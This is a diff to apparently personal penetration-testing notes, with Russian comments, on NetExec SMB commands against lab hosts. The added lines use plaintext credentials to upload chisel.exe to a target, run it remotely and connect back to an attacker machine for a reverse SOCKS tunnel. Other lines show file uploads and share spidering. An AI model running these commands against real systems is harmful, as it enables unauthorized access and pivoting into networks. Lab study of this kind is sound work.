@@ -181,6 +181,10 @@
 
 	# Отправка файла по пути
 	nxc smb 10.129.203.121 -u grace -p Inlanefreight01! --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe 
+	
+	nxc smb 10.129.204.178 -u robert -p 'Inlanefreight01!' --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe 
+	./chisel server --reverse 
+	nxc smb 10.129.204.178 -u robert -p 'Inlanefreight01!' -x "C:\Windows\Temp\chisel.exe client 10.10.15.118:8080 R:socks"
 
 	# список файлов доступных пользователю c загрукзой
 	mxc smb 10.129.203.121 -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false
